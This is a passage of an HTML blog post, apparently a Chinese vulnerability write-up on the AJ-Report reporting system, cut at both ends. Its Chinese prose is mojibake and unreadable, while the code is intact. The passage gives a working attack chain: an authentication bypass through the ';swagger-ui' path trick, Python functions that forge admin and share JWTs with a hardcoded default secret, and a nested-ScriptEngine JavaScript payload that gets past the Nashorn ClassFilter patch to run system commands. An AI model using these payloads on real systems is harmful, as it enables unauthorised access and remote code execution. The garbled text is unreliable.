title="é‰´æƒç»•è¿‡"></a>é‰´æƒç»•è¿‡</h5><p>è¿™ä¸ªç³»ç»Ÿçš„æ¥å£ç»å¤§éƒ¨åˆ†éƒ½éœ€è¦ç™»é™†ï¼Œéœ€è¦ç»•ä¸€ä¸‹ã€‚</p><p>é‰´æƒåœ¨<code>TokenFilter</code>ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510135030938.png" alt="image-20240510135030938"></p><p>ç»å…¸çš„é€šè¿‡<code>request.getRequestURI()</code>æ‹¿åˆ°<code>uri</code>ï¼Œåé¢å¦‚æœ<code>uri</code>åŒ…å«<code>swagger-ui</code>ç›´æ¥æ”¾è¡Œã€‚</p><p>å› ä¸ºæ˜¯æ‹¿çš„<code>URI</code>ï¼Œæ²¡æœ‰å‚æ•°ä¿¡æ¯æ‰€ä»¥æ²¡æ³•ç”¨<code>?swagger-ui</code>ç»•ã€‚</p><p>ä½†å¯ä»¥ç”¨<code>;swagger-ui</code>ç»•è¿‡ï¼Œå› ä¸º<code>parsePathParameters:950, CoyoteAdapter (org.apache.catalina.connector)</code>è¿™é‡Œä¼šå–åˆ†å·ä½œä¸º<code>pathParamStart</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510154835262.png" alt="image-20240510154835262"></p><p>è€Œ<code>pathParamEnd</code>è¿™é‡Œä¼šå–<code>/</code>ä½œä¸ºç»“å°¾ã€‚æœ€åæˆªæ–­ä¸­é—´çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´<code>/a;b/c</code>æœ€ç»ˆä¼šè§£æä¸º<code>/a/c</code></p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715327731929.png" alt="1715327731929"></p><p>æ‰€ä»¥ç”¨<code>/dataSetParam;swagger-ui/verification</code>å°±èƒ½è¯·æ±‚åˆ°åç«¯æ¥å£äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715327932734.png" alt="1715327932734"></p><h5 id="å¦ä¸€å¤„é‰´æƒç»•è¿‡ï¼ˆé»˜è®¤keyï¼‰"><a href="#å¦ä¸€å¤„é‰´æƒç»•è¿‡ï¼ˆé»˜è®¤keyï¼‰" class="headerlink" title="å¦ä¸€å¤„é‰´æƒç»•è¿‡ï¼ˆé»˜è®¤keyï¼‰"></a>å¦ä¸€å¤„é‰´æƒç»•è¿‡ï¼ˆé»˜è®¤keyï¼‰</h5><p>å¦‚æœ<code>swagger-ui</code>æ”¾è¡Œé‚£é‡Œè¢«ä¿®å¤äº†æ€ä¹ˆåŠå‘¢ï¼Ÿå¯ä»¥çœ‹åˆ°åç»­ä¼šæ ¡éªŒ<code>token</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715402625974.png" alt="1715402625974"></p><p>æ ¡éªŒ<code>token</code>ç±»ä¹Ÿæ˜¯å®‰å‰è‡ªå·±å†™çš„ï¼Œç»™<code>jwt payload</code>åŠ äº†å››ä¸ª<code>key-value pairs</code>ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> String <span class="token function">createToken</span><span class="token punctuation">(</span>String username<span class="token punctuation">,</span> String uuid<span class="token punctuation">,</span> Integer type<span class="token punctuation">,</span> String tenantCode<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String token <span class="token operator">=</span> JWT<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withClaim</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withClaim</span><span class="token punctuation">(</span><span class="token string">"uuid"</span><span class="token punctuation">,</span> uuid<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withClaim</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withClaim</span><span class="token punctuation">(</span><span class="token string">"tenant"</span><span class="token punctuation">,</span> tenantCode<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>Algorithm<span class="token punctuation">.</span><span class="token function">HMAC256</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>gaeaProperties<span class="token punctuation">.</span><span class="token function">getSecurity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getJwtSecret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> String <span class="token function">getUsername</span><span class="token punctuation">(</span>String token<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Claim claim <span class="token operator">=</span> <span class="token punctuation">(</span>Claim<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClaim</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> claim <span class="token operator">==</span> null <span class="token operator">?</span> null <span class="token operator">:</span> claim<span class="token punctuation">.</span><span class="token function">asString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‡ç‚¹æ¥äº†ï¼Œé€šè¿‡<code>this.gaeaProperties.getSecurity().getJwtSecret()</code>æ‹¿åˆ°å¯†é’¥ã€‚</p><p><code>jwt</code>å¯†é’¥åœ¨<code>GaeaProperties$Security</code>ç±»é‡Œï¼Œè€Œ<code>setJwtSecret</code>æ–¹æ³•æ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼Œå› æ­¤<code>key</code>æ˜¯é»˜è®¤çš„ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240511125152829.png" alt="image-20240511125152829"></p><p>ä¼ªé€ <code>jwt</code>å³å¯ã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getFakeToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token string">"uuid"</span><span class="token punctuation">:</span> <span class="token string">"627750b8be86421d94facec7e4dba555"</span><span class="token punctuation">,</span>        <span class="token string">"tenant"</span><span class="token punctuation">:</span> <span class="token string">"tenantCode"</span><span class="token punctuation">,</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span>    <span class="token punctuation">}</span>    fakeToken <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span><span class="token string">'anji_plus_gaea_p@ss1234'</span><span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> fakeToken<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡æ ¡éªŒã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715404334246.png" alt="1715404334246"></p><p>å…‰ä¼ªé€ <code>token</code>è¿˜ä¸å¤Ÿã€‚åé¢è¿˜æœ‰ä¸ªç™»é™†ç¼“å­˜éªŒè¯ï¼Œç¼“å­˜é€»è¾‘å…·ä½“å¯å‚è€ƒ<code>/accessUser/login</code>è·¯ç”±é€»è¾‘ã€‚<code>token</code>çš„æ—¶æ•ˆæ˜¯1å°æ—¶ï¼Œå¦‚æœè¿œç¨‹ä¸€å°æ—¶å†…æ²¡æœ‰<code>admin</code>ç™»å½•è¿‡é‚£ä¹ˆç¼“å­˜å°±ä¼šå¤±æ•ˆã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715404399333.png" alt="1715404399333"></p><p>ä½†æ˜¯çœ‹åˆ°è¿™é‡Œå‡ºç°äº†è½¬æœºï¼Œæ¥ä¸‹æ¥ä¼šæ ¡éªŒ<code>shareToken</code>ï¼Œå¦‚æœ<code>reportCodeList.stream().noneMatch(uri::contains)</code>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>uri</code>åŒ…å«<code>reportCode</code>çš„è¯å°±è¿”å›<code>false</code>ã€‚è€Œ<code>shareToken</code>æ˜¯ä»<code>Share-Token</code>è¯·æ±‚å¤´å–çš„ã€‚</p><pre class="line-numbers language-java"><code class="language-java">List<span class="token operator">&lt;</span>String<span class="token operator">></span> reportCodeList <span class="token operator">=</span> JwtUtil<span class="token punctuation">.</span><span class="token function">getReportCodeList</span><span class="token punctuation">(</span>shareToken<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>uri<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"/reportDashboard/getData"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>uri<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"/reportExcel/preview"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> reportCodeList<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">noneMatch</span><span class="token punctuation">(</span>uri<span class="token operator">:</span><span class="token operator">:</span>contains<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    ResponseBean responseBean <span class="token operator">=</span> ResponseBean<span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">code</span><span class="token punctuation">(</span><span class="token string">"50014"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"åˆ†äº«é“¾æ¥å·²è¿‡æœŸ"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>responseBean<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†çœ‹ä¸€ä¸‹<code>shareToken</code>ç­¾åï¼Œå¯†é’¥åŒæ ·ç¡¬ç¼–ç ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240511132508126.png" alt="image-20240511132508126"><br><code>shareToken</code>é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¼ªé€ ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getFakeShareToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"shareCode"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"reportCode"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#é€šç”¨æ€§</span>        <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">4070880000</span><span class="token punctuation">,</span>        <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1715402146</span><span class="token punctuation">,</span>        <span class="token string">"sharePassword"</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token punctuation">}</span>    fakeShareToken <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>JWT_SECRET<span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> fakeShareToken<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ªé€ å®Œ<code>shareToken</code>å°±å¯ä»¥è®¿é—®æ¥å£äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715405171916.png" alt="1715405171916"></p><h5 id="nashornå¼•æ“æ‰§è¡Œè¡¨è¾¾å¼ç»•è¿‡"><a href="#nashornå¼•æ“æ‰§è¡Œè¡¨è¾¾å¼ç»•è¿‡" class="headerlink" title="nashornå¼•æ“æ‰§è¡Œè¡¨è¾¾å¼ç»•è¿‡"></a>nashornå¼•æ“æ‰§è¡Œè¡¨è¾¾å¼ç»•è¿‡</h5><p>æ¼æ´åœ¨<code>\src\main\java\com\anjiplus\template\gaea\business\modules\datasetparam\controller\DataSetParamController.java</code>ä¸­çš„<code>/verification</code>è·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°ä¼šè°ƒç”¨<code>verification</code>æ–¹æ³•ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510094647181.png" alt="image-20240510094647181"></p><p>è·Ÿè¿›<code>verification</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>engine.eval</code>æ‰§è¡Œä¸€æ®µè¡¨è¾¾å¼ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510094951944.png" alt="image-20240510094951944"></p><p>è€Œ<code>engine</code>é’ˆå¯¹<code>CNVD-2024-15077</code>åšäº†<code>PATCH</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510095042142.png" alt="image-20240510095042142"></p><p>çœ‹ä¸‹<code>diff</code>ï¼ŒåŠ äº†<code>ClassFilter</code>ï¼Œè¿‡æ»¤äº†å‘½ä»¤æ‰§è¡Œçš„ä¸‰ä¸ªç±»ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715307362768.png" alt="1715307362768"></p><p>ä¸å¤ªäº†è§£è¿™ä¸ªé˜²å¾¡é€»è¾‘æ˜¯å•¥ï¼Œå…ˆå°è¯•æ‰“æ–­ç‚¹çœ‹çœ‹æ˜¯ä»€ä¹ˆé€»è¾‘ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715307603132.png" alt="1715307603132"></p><p>åˆ°è¿™é‡Œæœ‰ä¸ª<code>classFilter</code>ã€‚è°ƒäº†ä¸ªå¯‚å¯ï¼Œè¿˜æ˜¯çœ‹çœ‹æ€ä¹ˆ<code>ban</code>æ‰ç±»çš„é€»è¾‘å§ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715307815270.png" alt="1715307815270"></p><p>å…ˆç”¨åŸç‰ˆ<code>payload</code>æ‰“ä¸€ä¸‹ï¼Œç®€å•è§£é‡Šä¸‹ï¼Œæµä¼ åœ¨ç½‘ä¸Šçš„<code>payload</code>å®šä¹‰äº†<code>verification</code>å‡½æ•°æ˜¯å› ä¸ºæ‰§è¡Œå®Œ<code>js</code>åä¼šè°ƒç”¨<code>js</code>ä¸­çš„<code>verification</code>å‡½æ•°ï¼Œéšåå°†æ‰§è¡Œç»“æœè¿”å›ã€‚<code>verification</code>å‡½æ•°å°±æ˜¯å¸¸è§„çš„è°ƒç”¨<code>java.lang.ProcessBuilder(&#39;whoami&#39;).start()</code>æ‰§è¡Œå‘½ä»¤ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">verification</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> se<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span>ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>result<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ss<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ss<span class="token operator">+</span><span class="token operator">=</span>line<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> ss<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰§è¡Œå¤±è´¥ï¼Œæç¤ºæ‰¾ä¸åˆ°è¿™ä¸ªç±»ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715308365531.png" alt="1715308365531"></p><p>æ‰“å¼‚å¸¸æ–­ç‚¹çœ‹è°ƒç”¨æ ˆï¼š</p><pre class="line-numbers language-java"><code class="language-java">classNotFound<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token function">NativeJavaPackage</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span>invokeStatic_L_V<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">282828951</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span>LambdaForm$DMH<span class="token punctuation">)</span>reinvoke<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">1395859879</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span>LambdaForm$BMH<span class="token punctuation">)</span>dontInline<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">1043162593</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span>LambdaForm$reinvoker<span class="token punctuation">)</span>guard<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">1912131086</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span>LambdaForm$MH<span class="token punctuation">)</span>linkToCallSite<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">23493645</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span>LambdaForm$MH<span class="token punctuation">)</span>verification<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span> Script$Recompilation$<span class="token number">4</span>$27A$\<span class="token operator">^</span>eval\<span class="token function">_</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>scripts<span class="token punctuation">)</span>invokeStatic_L3_L<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">246550802</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span>LambdaForm$DMH<span class="token punctuation">)</span>invokeExact_MT<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">664302677</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span>LambdaForm$MH<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">639</span><span class="token punctuation">,</span> <span class="token function">ScriptFunctionData</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">494</span><span class="token punctuation">,</span> <span class="token function">ScriptFunction</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span>apply<span class="token operator">:</span><span class="token number">393</span><span class="token punctuation">,</span> <span class="token function">ScriptRuntime</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span>callMember<span class="token operator">:</span><span class="token number">199</span><span class="token punctuation">,</span> <span class="token function">ScriptObjectMirror</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>api<span class="token punctuation">.</span>scripting<span class="token punctuation">)</span>invokeImpl<span class="token operator">:</span><span class="token number">386</span><span class="token punctuation">,</span> <span class="token function">NashornScriptEngine</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>api<span class="token punctuation">.</span>scripting<span class="token punctuation">)</span>invokeFunction<span class="token operator">:</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token function">NashornScriptEngine</span> <span class="token punctuation">(</span>jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>api<span class="token punctuation">.</span>scripting<span class="token punctuation">)</span>verification<span class="token operator">:</span><span class="token number">106</span><span class="token punctuation">,</span> DataSetParamServiceImpl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éƒ½æ˜¯åŒ¿åå‡½æ•°ï¼Œæ„Ÿè§‰ä¸å¤ªèƒ½<code>debug</code>ã€‚ã€‚</p><p>ç»è¿‡ä¸€ç•ªæ£€ç´¢å‘ç°æ­¤å¤„é’ˆå¯¹<code>nashorn</code>çš„å®‰å…¨è¿‡æ»¤æ˜¯<code>JEP202</code>ï¼Œè¿˜æ˜¯çœ‹æ–‡æ¡£å§ï¼š<a href="https://openjdk.org/jeps/202%E3%80%82">https://openjdk.org/jeps/202ã€‚</a></p><pre class="line-numbers language-apl"><code class="language-apl">Provide a Java class<span class="token function">-</span>access filtering interface<span class="token function">,</span> ClassFilter<span class="token function">,</span> that can be implemented by Java applications that use Nashorn<span class="token dyadic-operator operator">.</span>æä¾›ä¸€ä¸ª Java ç±»è®¿é—®è¿‡æ»¤æ¥å£ ï¼ŒClassFilterå¯ä»¥ç”±ä½¿ç”¨ Nashorn çš„ Java åº”ç”¨ç¨‹åºå®ç°ã€‚Nashorn will query a provided instance of the ClassFilter interface before accessing any Java class from a script in order to determine whether the access is allowed<span class="token dyadic-operator operator">.</span> This will occur whether or not a security manager is present<span class="token dyadic-operator operator">.</span>Nashorn å°†åœ¨ä»è„šæœ¬è®¿é—®ä»»ä½• Java ç±»ä¹‹å‰æŸ¥è¯¢æä¾›çš„æ¥å£å®ä¾‹ClassFilterï¼Œä»¥ç¡®å®šæ˜¯å¦å…è®¸è®¿é—®ã€‚æ— security manageræ˜¯å¦å­˜åœ¨ï¼Œéƒ½ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚A script should not be able to subvert restrictions by a class filter in any way<span class="token function">,</span> not even by using Java's reflection APIs<span class="token dyadic-operator operator">.</span>è„šæœ¬ä¸åº”è¯¥èƒ½å¤Ÿä»¥ä»»ä½•æ–¹å¼ç ´åç±»è¿‡æ»¤å™¨çš„é™åˆ¶ï¼Œå³ä½¿ä½¿ç”¨ Java çš„åå°„ API ä¹Ÿä¸è¡Œã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå­˜åœ¨ç±»è¿‡æ»¤å™¨ï¼Œå³ä½¿ä¸å­˜åœ¨<code>security manager</code>ï¼Œ<code>Nashorn</code> ä¹Ÿä¸è®©ä½ ç”¨åå°„ã€‚å¦‚æœåå°„å¯ç”¨é‚£ä¹ˆä½¿ç”¨ç±»è¿‡æ»¤å™¨å°±æ²¡æœ‰æ„ä¹‰äº†ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨åå°„æ¥ç»•è¿‡ç±»è¿‡æ»¤å™¨ã€‚å°è¯•äº†ä¸€ä¸‹åå°„ç¡®å®ä¸è¡Œã€‚</p><p>ä¸è¿‡å‚è€ƒ<code>JEP290</code>å¤§æ¦‚çŒœåˆ°<code>JEP202</code>ä¹Ÿï¼ˆåªï¼‰æ˜¯ä¼šè¿‡æ»¤ç±»ï¼Œè€Œä¸æ˜¯æŠŠå‘½ä»¤æ‰§è¡Œçš„ç±»é˜‰å‰²äº†ã€‚</p><p>æ‰€ä»¥ç›´æ¥ç”¨å¥—å¨ƒçš„æ–¹å¼ç»•å°±è¡Œï¼Œåœ¨é‡Œé¢å†<code>new</code>ä¸€ä¸ª<code>ScriptEngineManager</code>ï¼Œç„¶åå†<code>eval</code>å°±è¡Œã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">verification</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> se<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span>ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> r <span class="token operator">=</span> se<span class="token punctuation">.</span><span class="token function">getEngineByExtension</span><span class="token punctuation">(</span>\"js\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>\"<span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\"<span class="token punctuation">)</span><span class="token punctuation">;</span>result<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ss<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ss<span class="token operator">+</span><span class="token operator">=</span>line<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> ss<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715318752312.png" alt="1715318752312"></p><h5 id="åˆ«çš„è·¯ç”±"><a href="#åˆ«çš„è·¯ç”±" class="headerlink" 